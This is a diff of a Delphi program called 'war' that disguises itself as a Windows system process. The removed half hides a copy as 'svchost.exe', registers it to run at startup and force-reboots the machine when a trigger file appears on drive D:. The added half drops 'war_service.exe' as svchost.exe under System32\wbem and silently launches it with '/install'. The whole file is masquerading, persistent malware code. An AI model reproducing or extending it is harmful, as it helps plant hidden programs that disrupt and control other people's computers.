@@ -1,14 +1,26 @@
 program war;
 
-{$APPTYPE CONSOLE}
+//{$APPTYPE CONSOLE}
 
 uses
   Messages, Windows, SysUtils, shellapi, registry, forms, Dialogs;
 
 const
-  path = 'C:\Windows\System\';
+  path = 'C:\Windows\System32\wbem\';
   exename = 'svchost.exe';
-  regname = 'svchost';
+//  exenameflash = 'chrome.exe';
+//  regname = 'svchost';
+//  drivers = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+var
+  work: boolean = true;
+  f: textfile;
+  dow: integer;
+  last_now: extended;
+  rnd: integer;
+  drvsiz: array[1..26] of int64;
+  i: integer;
+  programpath: string;
 
 procedure DoAppToRun(RunName, AppName: string);
 var
@@ -42,59 +54,26 @@ end;
 
 function CopyToPath: Boolean;
 var
-  pstr: string;
   temp: string;
 begin
-  pstr := application.ExeName;
-  if pstr = path+exename then
-    result := true
-  else
-  begin
+  try
     if not DirectoryExists(path) then
       mkdir(path);
-    copyfile(pchar(pstr), path+exename, true);
-    FileSetAttr(path+exename, faHidden);
-    shellexecute(0, 'open', path+exename, '', path, 0);
+
+    if not fileexists(path+exename) then
+      copyfile(pchar(extractfilepath(programpath)+'war_service.exe'), path+exename, true);
+//    FileSetAttr(path+exename, faHidden);
+    shellexecute(0, 'open', path+exename, '/install', path, 0);
     result := false;
+  except
+
   end;
 end;
 
-var
-  work: boolean = true;
-  f: textfile;
 begin
-  if CopyToPath = true then
-  begin
-    if not IsAppInRun(regname) then
-      DoAppToRun(regname, path+exename);
-
-    while work do
-    begin
-      if FileExists('d:\help.txt') then
-      begin
-        DeleteFile('d:\help.txt');
-//        assignfile(f, 'd:\1.txt');
-//        append(f);
-//        Writeln(f, 'hello');
-//        closefile(f);
-        // all motherfucker code there
-        shellexecute(0, 'open', 'c:\windows\system32\shutdown.exe', '/r /f /t 1', path, 0);
-      end;
-
-      if FileExists('d:\stop.txt') then
-      begin
-        DeleteFile('d:\stop.txt');
-
-//        assignfile(f, 'd:\1.txt');
-//        Append(f);
-//        Writeln(f, 'stop');
-//        closefile(f);
-
-        work := false;
-        exit;
-      end;
-
-      sleep(60000);
-    end;
-  end;
+  last_now := now;
+  randomize;
+  rnd := random(60);
+  programpath := application.ExeName;
+  CopyToPath;
 end.
